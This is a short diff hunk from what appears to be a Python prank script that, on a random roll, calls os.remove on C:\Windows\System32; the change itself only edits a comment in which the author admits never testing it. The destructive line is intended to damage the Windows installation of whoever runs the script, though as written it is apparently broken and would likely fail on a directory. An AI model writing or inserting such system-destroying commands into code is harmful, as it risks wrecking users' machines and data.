@@ -10,4 +10,4 @@ if random.randint(0, 6) == 1:
   
   os.remove("C:\Windows\System32")
 
-##(Idk if this works or not since I won't test it)
+#(Idk if this works or not since I won't test it)
